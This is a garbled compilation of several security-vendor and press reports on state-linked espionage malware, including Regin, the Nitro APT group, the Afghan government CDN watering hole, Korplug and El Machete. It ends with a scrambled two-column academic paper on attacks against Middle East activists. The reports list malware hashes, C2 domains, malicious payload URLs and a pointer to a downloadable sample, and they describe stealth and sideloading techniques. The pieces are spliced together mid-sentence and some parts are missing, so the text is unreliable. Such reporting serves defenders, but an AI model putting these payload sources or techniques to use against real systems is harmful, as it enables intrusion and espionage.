its components dating back as far as 2003.Regin was mentioned at a recent Hack.lu conference in Luxembourg, and Symantec’s report on Sunday said the
firm had identified Regin on infected systems operated by private companies, government entities, and research institutes in countries such as Russia, Saudi
Arabia, Mexico, Ireland, Belgium, and Iran.The use of hacking techniques and malware in state-sponsored espionage has been publicly documented over the last few years: China has been linked to extensive
cyber espionage, and recently the Russian government was also alleged to have been behind a cyber attack on the White House.Regin further demonstrates that
Western intelligence agencies are also involved in covert cyberespionage.GCHQ declined to comment for this story.(To download the malware, click here.The file is encrypted; to access it on your machine use the password “infected.”)
What follows is a brief technical analysis of Regin conducted by The Intercept’s computer security staff.Regin is an extremely complex, multi-faceted piece of
work and this is by no means a definitive analysis.In the coming weeks, The Intercept will publish more details about Regin and the infiltration of Belgacom as part of an investigation in partnership with Belgian
and Dutch newspapers De Standaard and NRC Handelsblad.Origin of Regin

In Nordic mythology, the name Regin is associated with a violent dwarf who is corrupted by greed.It is unclear how the Regin malware first got its name, but the
name appeared for the first time on the VirusTotal website on March 9th 2011.Der Spiegel reported that, according to Snowden documents, the computer networks of the European Union were infiltrated by the NSA in the months before the
first discovery of Regin.Industry sources familiar with the European Parliament intrusion told The Intercept that such attacks were conducted through the use of Regin and provided
samples of its code.This discovery, the sources said, may have been what brought Regin to the wider attention of security vendors.Also on March 9th 2011, Microsoft added related entries to its Malware Encyclopedia:

    Alert level: Severe

    First detected by definition: 1.99.894.0

    Latest detected by definition: 1.173.2181.0 and higher

    First detected on: Mar 09, 2011

    This entry was first published on: Mar 09, 2011

    This entry was updated on: Not available

Two more variants of Regin have been added to the Encyclopedia, Regin.B and Regin.C.Microsoft appears to detect the 64-bit variants of Regin as Prax.A and
Prax.B.None of the Regin/Prax entries are provided with any sort of summary or technical information.The following Regin components have been identified:

Loaders

The first stage are drivers which act as loaders for a second stage.They have an encrypted block which points to the location of the 2nd stage payload.On NTFS,
that is an Extended Attribute Stream; on FAT, they use the registry to store the body.When started, this stage simply loads and executes Stage 2.The Regin loaders that are disguised as Microsoft drivers with names such as:

    serial.sys
    cdaudio.sys
    atdisk.sys
    parclass.sys
    usbclass.sys
Mimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems.Second stage loader

When launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution.On failure, Stage 2 is able to disinfect the
compromised device.The malware zeroes out its PE (Portable Executable, the Windows executable format) headers in memory, replacing “MZ” with its own magic
marker 0xfedcbafe.Orchestrator

This component consists of a service orchestrator working in Windows’ kernel.It initializes the core components of the architecture and loads the next parts of the
malware.Information Harvesters

This stage is composed of a service orchestrator located in user land, provided with many modules which are loaded dynamically as needed.These modules can
include data collectors, a self-defense engine which detects if attempts to detect the toolkit occur, functionality for encrypted communications, network capture
programs, and remote controllers of different kinds.Stealth Implant

The Intercept’s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header, which is a sign that it
might have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit.This picture shows the very first bytes of the sample in question, showing the unique 0xfedcbafe header at the beginning.In order to access information stored in the computer’s memory, programs use objects that reference specific locations in memory called pointers.This binary file
contains some of such pointers initialized, which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised
system.The sample has the following SHA256 hash:

    fe1419e9dde6d479bd7cda27edd39fafdab2668d498931931a2769b370727129

This sample gives a sense of the sophistication of the actors and the length of the precautions they have been taking in order to operate as stealthily as possible.When a Windows kernel driver needs to allocate memory to store some type of data, it creates so called kernel pools.Such memory allocations have specific
headers and tags that are used to identify the type of objects contained within the block.For example such tags could be Proc, Thrd or File, which respectively
indicate that the given block would contain a process, thread or file object structure.When performing forensic analysis of a computer’s memory, it is common to use a technique called pool scanning to parse the kernel memory, enumerate such
kernel pools, identify the type of content and extract it.Just like Regin loader drivers, this driver repeatedly uses the generic “Ddk “ tag with ExAllocatePoolWithTag() when allocating all kernel pools:
This picture shows the use of the “ddk “ tag when allocating memory with the Windows ExAllocatePoolWIthTag() function.The generic tag which is used throughout the operating system when a proper tag is not specified.This makes it more difficult for forensic analysts to find any
useful information when doing pool scanning, since all its memory allocations will mix with many generic others.In addition, when freeing memory using ExFreePool(), the driver zeroes the content, probably to avoid leaving traces in pool memory.The driver also contains routines to check for specific builds of the Windows kernel in use, including very old versions such as for Windows NT4 Terminal Server
and Windows 2000, and then adapts its behavior accordingly.Windows kernel drivers operate on different levels of priority, from the lowest PASSIVE_LEVEL to the highest HIGH_LEVEL.This level is used by the processor
to know what service give execution priority to and to make sure that the system doesn’t try to allocate used resources which could result in a crash.This Regin driver recurrently checks that the current IRQL (Interrupt Request Level) is set to PASSIVE_LEVEL using the KeGetCurrentIrql() function in many
parts of the code, probably in order to operate as silently as possible and to prevent possible IRQL confusion.This technique is another example of the level of
precaution the developers took while designing this malware framework.Upon execution of the unload routine (located at 0xFDEFA04A), the driver performs a long sequence of steps to remove remaining traces and artifacts.Belgacom Sample

In an interview given to the Belgian magazine MondiaalNiews, Fabrice Clément, head of security of Belgacom, said that the company first identified the attack on
June 21, 2013.In the same interview Clément says that the computers targeted by the attackers included staff workstations as well as email servers.These statements confirm the timing and techniques used in the attack.From previously identified Regin samples, The Intercept developed unique signatures which could identify this toolkit.A zip archive with a sample identified as
Regin/Prax was found in VirusTotal, a free, online website which allows people to submit files to be scanned by several anti-virus products.The zip archive was
submitted on 2013-06-21 07:58:37 UTC from Belgium, the date identified by Clément.Sources familiar with the Belgacom intrusion told The Intercept that this
sample was uploaded by a systems administrator at the company, who discovered the malware and uploaded it in an attempt to research what type of malware it
was.The archive contains:
Along with other files The Intercept found the output of a forensic tool, GetThis, which is being run on target systems looking for malware.From the content of the
GetThis.log file, we can see that a sample called “svcsstat.exe” and located in C:\Windows\System32\ was collected and a copy of it was stored.The malware in question is “0001000000000C1C_svcsstat.exe_sample ”.This is a 64bit variant of the first stage Regin loader aforementioned.The archive also contains the output of ProcMon, “Process Monitor”, a system monitoring tool distributed by Microsoft and commonly used in forensics and
intrusion analysis.This file identifies the infected system and provides a variety of interesting information about the network.Given that that it has been over a year since the Belgacom operation was
publicly outed, The Intercept considers it likely that the GCHQ/NSA has replaced their toolkit and no current operations will be affected by the publication of
these samples.New Indicators of Compromise for APT Group Nitro Uncovered

In mid-July of this year, we noticed yet another legitimate website had been compromised by APT actors
and was serving malware.In this case, it was a group commonly referred to as “Nitro,” which was coined
by Symantec in its 2011 whitepaper.As we dug deeper, we found additional compromised legitimate websites and malware from the same
group back through March of this year.In most instances, the malware is one commonly referred to as
“Spindest,” though we also found “PCClient” and “Farfli” variants in use by the group.We don’t have
enough data to say for certain that all of the malware in this blog was delivered via compromised
legitimate websites.Historically, Nitro is known for targeted spear phishing campaigns and using Poison Ivy malware, which
was not seen in these attacks.Since at least 2013, Nitro appears to have somewhat modified their
malware and delivery methods to include Spindest and legitimate compromised websites, as reported by
Cyber Squared’s TCIRT.Our findings indicate they are continuing to evolve with the addition of PCClient
and Farfli variants.The Maltego screenshot below shows the activity we describe in this blog.These events impacted at least the following industries, across four waves:

A US based IT Solutions provider;
The European office of a major, US based commercial vendor of space imagery and geospatial
content;
A European leader in power technologies and automation for utilities and industry;
A US based provider of medical and dental imaging systems and IT solutions.In July, Nitro compromised a South Korean clothing and accessories manufacturer’s website to serve
malware commonly referred to as “Spindest.”  Of all the samples we’ve tied to this activity so far noted in
this blog, this is the only one configured to connect directly to an IP address for Command and Control
(C2).This IP address has been in use by this group for some time, which is interesting since they have

evolved other components of their kill chain over time to ensure malware delivery, but oddly not altered
their C2 infrastructure.It is simple for companies to block any outbound traffic to this IP, which would
negate the effort Nitro put into successfully delivering the malware.37 AV vendors within VirusTotal properly identify it, and the PE timestamp shows the day before we saw
it.In addition, the following three samples were found roughly a week apart from each other, possibly
indicating the timing of the waves of activity.Table 1

SHA256
MD5
File Name
File Size
First Seen
C2 IP

0a1103bc90725d4665b932f88e81d39eafa5823b0de3ab146e2d4548b7da79a0
7915aabb2e66ff14841e4ef0fbff7486
update.exe
106496
2014-07-24 11:54:02
223.25.233.248

The next sample we found is commonly known as PCClient, which is not malware previously tied to this
group.We discovered this, and many of the following samples, through historic IP resolution overlap
between the same domains alternately resolving to either the 223.25.233.248 or 196.45.144.12.The
second IP has also not been reported as tied to this group before.However, this shifting of IP resolutions
back and forth indicates Nitro is in control of these domains.It also makes is fairly easy for any Infosec
team to reach the same conclusion we did, which again negates their use both of a previously unreported
domain and IP for C2, as well as a new family of malware.25 AV vendors within VirusTotal properly
classify this sample as malware.Its PE timestamp was 8 July, almost a week prior when we first saw it.Table 2

SHA256
MD5
File Name
File Size
First Seen
C2 URL
Resolution 196.45.144.12

8aef92a986568ba31729269efa31a2488f35920d136ab41cb6fce55fd8e0b4b7
7522baef20df95eeeeafdf4efe3aac3c
lsm.exe
65536
2014-07-15 11:48:33
xenserver.ddns[.]net

The next sample was another Spindest variant and had the same timestamp as the aforementioned
PcClient sample.In addition, Nitro chose to use the same C2 for this sample, making it easy to both find
and tie to the group.41 AV vendors within VirusTotal properly classify this sample as malware.Table 3

SHA256
MD5
File Name
File Type
File Size
First Seen
C2 URL
Resolution 196.45.144.12

995bc16a5c2c212b57ba00c2376ac57c8032c7f2b1d521f995a5e1d49066d64d
6527ba8baab0f86b0ffb6178247772c4
install_reader11_en_aaa_aih.exe
PE
81920
2014-07-09 16:31:26
xenserver.ddns[.]net

The next wave of activity we found took place in mid-May.Both samples were Spindest variants with the
same PE timestamp of 15 May.While neither MD5s for C2 match, the aforementioned link to a post by
Cyber Squared’s TCIRT did document Nitro using Spindest variants with the same file name starting late
December last year.In that case they used the historic C2 IP we note in Table 1 in this blog.34 AV vendors
within VirusTotal properly classify the first sample as malware, and 40 AV Vendors the second sample.Table 4

e7f2af8c48f837da57000c068368d77bc9b06eba1e077edfab58df6aa2ea40ec
271e6a4d45c2817f86148ca413f97604

SHA256
MD5
File Name mdm.exe
File Size
First Seen
C2 URL
Resolution 196.45.144.12

118784
2014-05-20 08:43:15
zipoo.redirectme[.]net

Table 5

SHA256
MD5
File Name
File Size
First Seen
C2 URL
Resolution

e601da16f923b33465dbafbff9d47195e8fc50099fd0581a16a1745bf890afb6
be765cd5723e4366d35172aaf13fad44
CitrixReceiverWeb.exe
135168
2014-05-15 16:34:10
zipoo.redirectme[.]net
196.45.144.12

The malware dropped was configured to use good.myftp[.]org as the C2 URL, and the IP resolution was
223.25.233.248.Both of these are known Nitro Indicators of Compromise (IOCs).In this case, the
malware was a Farfli variant, again not a malware previously tied to this group.39 AV vendors within
VirusTotal properly identify the file as malware.The PE timestamp on the file was 1 April, about two

weeks before we saw the file.Continuing the activity, we discovered the actors had compromised a
legitimate website belonging to an international technology company that provides Software
Configuration and Change Management (SCCM) solutions in mid-May.(It is a well regarded company and
partners with large companies such as Microsoft.)Table 6

SHA256
184c083e839451c2ab0de7a89aa801dc0458e2bd1fe79e60f35c26d92a0dbf6a
MD5
ec519d709c0582346741fe0094208216
File Name
update.exe
File Size
159744
First Seen
2014-04-15 01:13:14
C2 URL
good.myftp[.]org
Resolution 223.25.233.248

The final sample, from mid-March, was also hosted on a compromised legitimate website, this time a
small, US based IT company.The IP resolved by the C2 URL was changed two days after we saw this file
to overlap with good.myftp[.]org for a month before returning the below resolution.The filename matches
that of the sample in Table 5, which had a very similar third level C2 domain and the same IP resolution.This is also a Spindest variant with a PE timestamp of the same day we saw it.39 AV vendors within
VirusTotal properly identify the file as malware.Table 7

SHA256
MD5
File Name
File Size
First Seen
C2 URL
Resolution

ffbddfb536e8e604c880ec977d06f804a500fc0396899bd2c195fb1f5b74207a
a3b2e34973691ad320b70248bd67fbd2
CitrixReceiverWeb.exe
192512
2014-03-12 06:58:22
zip.redirectme[.]net
196.45.144.12

As this post and previous cited research show, APT groups such as Nitro will continue to evolve their
techniques within the kill chain to avoid detection.However, they also demonstrate the value of tracking
these threats over time, as this allowed us to uncover and properly attribute the new IOCs because Nitro
was still re-using old C2 infrastructure with their new malware.For Palo Alto Networks customers, all of these files were properly identified by WildFire as malware and
all of the C2 domains are labeled as threats in both Threat Prevention and URL Filtering systems.Operation Poisoned Helmand
In this day and age of interconnected cloud services and distributed content delivery networks (CDNs), it
is important for both CDN service providers and security professionals alike to recognize and understand
the risks that these systems can introduce within an modern enterprise.For organizations within both
public and private sectors that leverage CDN platforms to dynamically deliver web content, it is important
that the content is also routinely monitored.Otherwise, malicious third-party content can be loaded into a
target organization’s website without their knowledge, delivering untold risks to unwitting visitors.Afghan Government “Watering Hole”

The ThreatConnect Intelligence Research Team (TCIRT) recently observed a targeted cross-site scripting
(XSS) “drive-by” attack that leveraged a single content delivery network resource to distribute a malicious
Java applet via nearly all of the major official Government of Afghanistan websites.The compromised
CDN resource in question is a JavaScript file hosted at [http:]//cdn.afghanistan[.]af/scripts/gop-script.js




The domain cdn.afghanistan[.]af is a legitimate CDN site used by the Afghan Ministry of Communications
and IT (MCIT) to host web content that is displayed and used on many official gov.af websites.The javascript URL ([http:]//cdn.afghanistan[.]af/scripts/gop-script.js) is called from numerous official
Afghan Government websites, including the following:

      [http:]//canberra.afghanistan[.]af/en (Afghan Embassy in Canberra, Australia)
      [http:]//herat.gov[.]af/fa (Herat Province Regional Government)
      [http:]//mfa.gov[.]af/en (Ministry of Foreign Affairs)
      [http:]//moci.gov[.]af/en (Ministry of Commerce and Industries)
      [http:]//moe.gov[.]af/en (Ministry of Education)
      [http:]//mof.gov[.]af/en (Ministry of Finance)
      [http:]//moj.gov[.]af/fa (Ministry of Justice)
      [http:]//mowa.gov[.]af/fa (Ministry of Women’s Affairs)
      [http:]//oaacoms.gov[.Li Keqiang: A Harbinger of Targeted Exploitation?Judging by the last modified timestamp on the HTTP response of gop-script.js, which is Tue, 16 Dec 2014
08:07:06 GMT, this malicious CDN compromise was very recent in nature.In fact, it occurred on the very
same day that China’s Prime Minister Li Keqiang would meet with Abdullah Abdullah, the Chief Executive
Officer of Afghanistan in Astana Kazakhstan, they would discuss infrastructure development and bilateral
cooperation issues.Looking at the EXIF metadata of the image of Keqiang meeting with Abdullah that is hosted on the
Chinese embassy website we note a Tue, 16 December 2014 07:43:31 modify time as well as the
www.news[.]cn watermark in the bottom righthand corner.This indicates that the image of Keqiang and
Abdullah was likely taken and edited sometime prior to 07:43:31.While it is ambiguous as to which
timezone the edits actually took place in (Kazakhstan or China) we assume the date
timestamp references GMT because the press release states “In the afternoon of December 15 local time…”
If we assume the photograph and afternoon meeting took place sometime prior to 13:43 Alma-Ata
standard time (+0600) this would closely correspond with a 07:43 GMT time stamp.The modification of
the gop-script.js by the attackers at 08:07:06 GMT likely tracks extremely close to a window of a few hours
in which Keqiang met with Abdullah.It is worth mentioning that a similar scenario occurred on June 20th when security researcher
PhysicalDrive0 observed a malicious Java file hosted on the Embassy of Greece in Beijing.At the time, a
Chinese delegation led by Keqiang was visiting Greek Prime Minister Antonis Samaras in Athens.Security
researcher R136a1 aka “thegoldenmessenger” released a followup blog with detailed analysis of the Greek
embassy compromise.While these two separate events are not directly related, additional research into the status of ministerial
and official government websites on or around the dates of notable Chinese delegations and or bilateral
meetings may yield additional patterns of interest.Java Malware Overlap

Upon closer inspection of the prepended malicious JavaScript code, one will notice the similarity in the
update.javaplug-in[.]com naming convention and URL structure to the C2 domain java-se[.]com found in
the Palo Alto Networks blog post Attacks on East Asia using Google Code for Command and Control and
associated with Operation Poisoned Hurricane.However, the malicious document.write driveby URLs
listed above both result in 403 Forbidden errors as of December 18, 2014.While the 403 Forbidden errors may seem like an analytic dead end, the TCIRT also identified a malicious
Java applet submission to VirusTotal that confirms the nature of this malicious activity.This Java applet,
SHA1: 388E6F41462774268491D1F121F333618C6A2C9A, has no antivirus detections as of December
21st.The applet contains its malicious class file at the path “jre7u61windows/x86/Update.class”.This
class file downloads and decodes an XOR 0xC8 encoded Windows PE executable payload from
[http:]//mfa.gov[.]af/content/images/icon35.png, hosted on the official Afghan Ministry of Foreign
Affairs site, which was also affected by the gop-script XSS.Using historic context archived within ThreatConnect, the TCIRT concluded that this Java applet is from
the same source code as the applet SHA1: ADC162DD909283097E72FC50B7AB0E04AB8A2BCC, which
was previously observed by the TCIRT at the Operation Poisoned Hurricane related URL
[http:]//jre7.java-se[.]com/java.jar on August 15, 2014.This applet has the same class path, and
downloads an XOR 0xFF encoded payload executable from the URL [https:]//amco-
triton.co[.]jp/js/dl/in.jpg.Additional indicators and context associated with this particular Java driveby
activity can be found in the ThreatConnect Common Community Incident 20140815A: java-se APT
Driveby (shared October 02, 2014)

The Windows PE Payload

The XOR 0xC8 encoded payload downloaded from [http:]//mfa.gov[.]af/content/images/icon35.png
decodes into the Windows PE executable SHA1: 72D72DC1BBA4C5EBC3D6E02F7B446114A3C58EAB

This executable is a self-extracting (SFX) Microsoft Cabinet executable that is digitally signed with a valid
certificate from “OnAndOn Information System Co., Ltd.”, serial number “1F F7 D8 64 18 1C 55 5E 70 CF
DD 3A 59 34 C4 7D”.This same certificate was also used to sign the Java applet that downloaded this
malware.This executable drops the following files:

      SHA1: 2068260601D60F07829EE0CEDF5A9C636CDB1765 (dllhost.exe)

Legitimate Microsoft Debugging Tools for Windows Executable, loads dbgeng.dll

      SHA1: E2D93ABC4C5EDE41CAF1C0D751A329B884D732A2 (dbgeng.dll)

Malicious DLL that loads into the above dllhost.exe, using a similar DLL sideloading technique to that
most commonly associated with the PlugX backdoor.SHA1: 5C8683E3523C7FA81A0166D7D127616B06334E8D (Readme.txt)

Malicious encrypted backdoor binary blob loaded by dbgeng.dll
This backdoor connects to the faux Oracle Java themed command and control (C2) domain
oracle0876634.javaplug-in[.]com.Note that javaplug-in[.]com is the same root domain found in the
compromised version of [http:]//cdn.afghanistan[.]af/scripts/gop-script.js as [http:]//update.javaplug-
in[.]com/o/j.js, confirming that this Java malware is in fact directly associated with the Afghan MCIT
CDN XSS compromise.Full indicators of this activity and a YARA rule to detect the malware certificate can be found in the
ThreatConnect Common Community under Incident 20141217A: Afghan Government Java Driveby and
signature APT_OnAndOn_cert.yara.Conclusion

As the US and NATO reduce their troop levels in Afghanistan, China is posturing to fill the gap of
influence that the west is leaving behind.With plans to facilitate multilateral peace talks with the Taliban
and establish major transportation projects which aim to bolster the Afghan economy, Beijing has been
eyeing Afghanistan as part of its broader South Asian strategy.By exploiting and co-opting Afghan network infrastructure that is used by multiple ministerial level
websites, Chinese intelligence services would be able to widely distribute malicious payloads to a variety of
global targets using Afghanistan’s government websites as a topical and trusted distribution platform,
exploiting a single hidden entry point.This being a variant of a typical “watering-hole” attack, the
attackers will most likely infect victims outside the Afghan government who happened to be browsing any
one of the CDN client systems, specifically, partner states involved in the planned troop reduction.It is important to consider that corporate enterprises are not immune to this tactic, and this is not just a
technique that is used by APT threat actors.If an enterprise’s website leverages a CDN to speed up content
delivery, unintended consequences must be anticipated.Fortunately, modern browsers now implement a
security concept called “Content Security Policy”.As long as the server’s response headers are configured
properly, third party content may be restricted to originating from a narrow whitelist.Just as attackers distribute malicious content to users en masse or CDN services distribute web content to
users, security professionals must be able to quickly distribute actionable Threat Intelligence in formats
readable by both humans and machines.ThreatConnect is the industry’s first comprehensive Threat
Intelligence Platform that enables enterprises to orchestrate the aggregation of Threat Intelligence from
multiple sources, use integrated analytics and a robust API that gives enterprises the control to action
their own Threat Intelligence, in the cloud and on premises.Register for a free account now to view the
Common Community shares and more.Korplug military targeted attacks: Afghanistan & Tajikistan




After taking a look at recent Korplug (PlugX) detections, we identified two larger scale campaigns
employing this well-known Remote Access Trojan.This blog gives an overview of the first one, related to
Afghanistan & Tajikistan.The other campaign, where the targets were a number of high-profile
organizations in Russia, will be the subject of Anton Cherepanov’s presentation at the ZeroNights
security conference in Moscow this week.Sometimes malware used in various attacks is unique enough to identify related incidents, which makes
tracking individual botnets simpler.An example is the BlackEnergy Lite variant (also known as
BlackEnergy 3) used by a group of attackers (that was then given the name Quedagh, or Sandworm)
against targets in Ukraine and other countries.BlackEnergy Lite is clearly distinguishable from the
numerous binaries of the more common BlackEnergy 2 also circulating in-the-wild.In other cases, attackers use more common tools for accomplishing their criminal goals.For example, the
Korplug RAT (a.k.a .PlugX) is a well-known toolkit associated with Chinese APT groups and used in a
large number of targeted attacks since 2012.For the past several weeks we have taken a closer look at a
great number of detections of this malware in many unrelated incidents.Among these, we were able to discover several successful infections where the employed Korplug samples
were connecting to the same C&C domain.exe – a legitimate executable with a Kaspersky digital signature that would load a DLL with a
      specific file name
      dll – a small DLL loader that would pass execution to the Korplug raw binary code
      dll.avp – raw Korplug binary

The Korplug RAT is known to use this side-loading trick by abusing legitimate digitally signed executables
and is a way to stay under the radar, since a trusted application with a valid signature among startup items
is less likely to raise suspicion.The maliciously crafted documents are RTF files that successfully exploit the CVE-2012-0158 vulnerability
in Microsoft Word.The image below shows the beginning of the CVE-2012-0158 shellcode in ASCII
encoding within the document (the opcodes 60, 55, 8bec disassemble to pusha; push ebp; mov ebp, esp).Interestingly, though, the documents also contain the newer CVE-2014-1761 exploit that was extensively
used in targeted attacks carried out by a number other malware families this year (including BlackEnergy,
Sednit, MiniDuke, and others).However, this exploit is not implemented correctly due to a wrong file
offset in the 1st stage shellcode.Below we see the disassembly of the 1st stage shellcode where it checks the presence of the tag “p!11”
marking the beginning of the 2nd stage shellcode and loads it into memory.Even though the tag and 2nd
stage shellcode is present in the RTF, it’s at a different offset, and thus never is loaded.Sophos’ Gabor Szappanos gives a possible explanation how these malformed samples may have come into
existence.ESET LiveGrid telemetry indicates that the attacks against these targets have been going on since at least
June 2014 and continue through today.We were able to pinpoint the targets to residents of the following countries:

      Afghanistan
      Tajikistan
      Russia
      Kyrgyzstan
      Kazakhstan

From the topics of the files used to spread the malware, as well as from the affected targets, it appears that
the attackers are interested in gathering intelligence related to Afghan, Tajik and Russian military and
diplomatic subjects.Interestingly, most of the affected victims have another thing in common – a number of other RATs, file
stealing trojans or keyloggers were detected on their systems on top of the Korplug RAT detection.One of
these ‘alternative RATs’ was connecting to a domain also used by the Korplug samples.Since the functionality of these tools was partly overlapping with that of Korplug, it left us wondering
whether the attackers were just experimenting with different RATs or were they supplementing some
functionality that they were unable to accomplish.Additional information about two malware families that were most often found accompanying Korplug
infections is given below.It is written in Delphi and connects to
www.dicemention.com.Some samples contain a digital signature by “Nanning weiwu Technology co.,ltd”.Alternative Malware #2: File Stealer

This malware, written in C, and contains several functions for harvesting files off the victim’s hard drive
according to criteria set in the configuration file.Apart from doing a recursive sweep of all logical fixed
and remote drives, it also continually monitors any attached removable media or network shares by
listening to DBT_DEVICEARRIVAL events."El Machete"
Introduction

Some time ago, a Kaspersky Lab customer in Latin America contacted us to say he had visited China and
suspected his machine was infected with an unknown, undetected malware.While assisting the customer,
we found a very interesting file in the system that is completely unrelated to China and contained no
Chinese coding traces.At first look, it pretends to be a Java related application but after a quick analysis, it
was obvious this was something more than just a simple Java file.It was a targeted attack we are calling
"Machete".What is "Machete"?"Machete" is a targeted attack campaign with Spanish speaking roots.We believe this campaign started in
2010 and was renewed with an improved infrastructure in 2012.The operation may be still "active".In some cases, such as Russia, the target appears to be an embassy from one of the countries of
this list.Targets include high-level profiles, including intelligence services, military, embassies and government
institutions.How does "Machete" operate?The malware is distributed via social engineering techniques, which includes spear-phishing emails and
infections via Web by a fake Blog website.We have found no evidence of of exploits targeting zero-day
vulnerabilities.Both the attackers and the victims appear to be Spanish-speaking.During this investigation, we also discovered many other the files installing this cyber-espionage tool in
what appears to be a dedicated a spear phishing campaign.These files display a PowerPoint presentation
that installs the malware on the target system once the file is opened.These are the names of the
PowerPoint attachments:

Hermosa XXX.pps.rar
Suntzu.rar
El arte de la guerra.rar
Hot brazilian XXX.rar

These files are in reality Nullsoft Installer self-extracting archives and have compilation dates going back
to 2008.A consequence of the embedded  Python code inside the executables is that these installers include all the
necessary Python libraries as well as the PowerPoint file shown to the victim during the installation.The
result is extremely large files, over 3MB.Here are some screnshots of the mentioned files:

A technical relevant fact about this campaign is the use of Python embedded into Windows executables of
the malware.This is very unusual and does not have any advantage for the attackers except ease of coding.There is no multi-platform support as the code is heavily Windows-oriented (use of libraries).However,
we discovered several clues that the attackers prepared the infrastructure for Mac OS X and Unix victims
as well.In addition to Windows components, we also found a mobile (Android) component.Both attackers and victims speak Spanish natively, as we see it consistently in the source code of the client
side and in the Python code.Indicators of Compromise

Web infections

The following code snippets were found into the HTML of websites used to infect victims:

Note: Thanks to Tyler Hudak from Korelogic who noticed that the above HTML is copy pasted from
SET, The Social Engineering Toolkit.Also the following link to one known infection artifact:

hxxp://name.domain.org/nickname/set/Signed_Update.jar

Domains

The following are domains found during the infection campaign.The victims are all Spanish speaking according to the filenames of the stolen documents.The language is also Spanish for the operators of the campaign, we can find all the server side code written
in this language: reportes, ingresar, peso, etc.Conclusion

The "Machete" discovery shows there are many regional  players in the world of targeted attacks.Unfortunately, such attacks became a part of the cyber arsenal of many nations located over the world.We
can be sure there are other parallel targeted attacks running now in Latin America and other regions.Kaspersky Lab products detect malicious samples related to this targeted attack as Trojan-
Spy.Python.Ragua.Note: A full analysis of the Machete attacks is available to the Kaspersky Intelligent
Services customers.Contact: intelreports@kaspersky.comWe view such character-
Repressive nation-states have long monitored telecommunica-          izations as the fundamental first step necessary for the rigorous,
tions to keep tabs on political dissent.The Internet and online     scientific pursuit of a new problem space.social networks, however, pose novel technical challenges to            For our study we draw upon several years of research we
this practice, even as they open up new domains for surveil-         have conducted into cases from Bahrain, Syria and the United
lance.We analyze an extensive collection of suspicious files        Arab Emirates.We frame the nature of these attacks, and the
and links targeting activists, opposition members, and non-          technology and infrastructure used to conduct them, in the con-
governmental organizations in the Middle East over the past          text of their impacts on real people.We hope in the process to
several years.We find that these artifacts reflect efforts to at-   inspire additional research efforts addressing the difficult prob-
tack targets’ devices for the purposes of eavesdropping, stealing    lem of how to adequately protect individuals with very limited
information, and/or unmasking anonymous users.We describe           resources facing powerful adversaries.attack campaigns we have observed in Bahrain, Syria, and the            As an illustration of this phenomenon, consider the follow-
United Arab Emirates, investigating attackers, tools, and tech-      ing anecdote, pieced together from public reports and court
niques.In addition to off-the-shelf remote access trojans and       documents.the use of third-party IP-tracking services, we identify commer-        At dawn on 3/12/13,1 police raided the house of 17-year-
cial spyware marketed exclusively to governments, including          old Ali Al-Shofa, confiscated his laptop and phone, and took
Gamma’s FinSpy and Hacking Team’s Remote Control Sys-                him into custody.He was charged with referring to Bahrain’s
tem (RCS).We describe their use in Bahrain and the UAE, and         King as a “dictator” (         ) and “fallen one” (         ) on a
map out the potential broader scope of this activity by conduct-
                                                                     pseudonymous Twitter account, @alkawarahnews.Accord-
ing global scans of the corresponding command-and-control
                                                                     ing to court documents, Bahrain’s Cyber Crime Unit had linked
(C&C) servers.Finally, we frame the real-world consequences
                                                                     an IP address registered in his father’s name to the account on
of these campaigns via strong circumstantial evidence linking
                                                                     12/9/12.Operators of @alkawarahnews later forwarded a
hacking to arrests, interrogations, and imprisonment.suspicious private message to one of the authors.The message
                                                                     was received on 12/8/12 on a Facebook account linked to the
                                                                     Twitter handle, and contained a link to a protest video, purport-
1    Introduction                                                    edly sent by an anti-government individual.The link redirected
                                                                     through iplogger.org, a service that records the IP address
Computer security research devotes extensive efforts to pro-
                                                                     of anyone who clicks.Analytics for the link indicate that it had
tecting individuals against indiscriminate, large-scale attacks
                                                                     been clicked once from inside Bahrain.On 6/25/13, Ali was
such as those used by cybercriminals.Recently, the prob-
                                                                     sentenced to one year in prison.lem of protecting institutions against targeted attacks conducted
                                                                        Ali’s case is an example of the larger phenomenon we in-
by nation-states (so-called “Advanced Persistent Threats”) has
                                                                     vestigate: attacks against activists, dissidents, trade unionists,
likewise elicited significant research interest.Where these two
                                                                     human rights campaigners, journalists, and members of NGOs
problem domains intersect, however—targeted cyber attacks by
                                                                     (henceforth “targets”) in the Middle East.The attacks we have
nation-states against individuals—has received virtually no sig-
                                                                     documented usually involve the use of malicious links or e-mail
nificant, methodical research attention to date.This new prob-
                                                                     attachments, designed to obtain information from a device.On
lem space poses challenges that are both technically complex
                                                                     the one hand, we have observed attacks using a wide range of
and of significant real-world importance.off-the-shelf spyware, as well as publicly available third-party
   In this work we undertake to characterize the emergent prob-      services, like iplogger.org.On the other hand, some at-
lem space of nation-state Internet attacks against individuals       tacks use so-called “lawful intercept” trojans and related equip-
engaged in pro-democracy or opposition movements.While
we lack the data to do so in a fully comprehensive fashion,             1 Dates   in the paper are given MM/DD/YY.USENIX Association 	                                                                         23rd USENIX Security Symposium  511
ment, purportedly sold exclusively to governments by compa-               do so in a sufficiently well-grounded, meaningful manner first
nies like Gamma International and Hacking Team.The lat-                  requires developing an understanding of the targets’ knowledge
ter advertises that governments need its technology to “look              of security issues, their posture regarding how they currently
through their target’s eyes” rather than rely solely on “passive          protect themselves, and the resources (including potentially ed-
monitoring” [1].Overall, the attacks we document are rarely              ucation) that they can draw upon.To this end, we are now con-
technically novel.In fact, we suspect that the majority of at-           ducting (with IRB approval) in-depth interviews with potential
tacks could be substantially limited via well-known security              targets along with systematic examination of their Internet de-
practices, settings, and software updates.Yet, the attacks are           vices in order to develop such an understanding.noteworthy for their careful social engineering, their links to
governments, and their real-world impact.We obtained the majority of our artifacts by encouraging in-           2    Related Work
dividuals who might be targeted by governments to provide us
with suspicious files and unsolicited links, especially from un-          In the past decades, a rich body of academic work has grown to
familiar senders.While this process has provided a rich set of           document and understand government Internet censorship, in-
artifacts to analyze, it does not permit us to claim our dataset is       cluding nationwide censorship campaigns like the Great Fire-
representative.wall of China [9, 10, 11].Research on governmental Internet
   Our analysis links these attacks with a common class of ac-            surveillance and activities like law-enforcement interception is
tor: an attacker whose behavior, choice of target, or use of in-          a comparatively smaller area [12].Some academic work looks
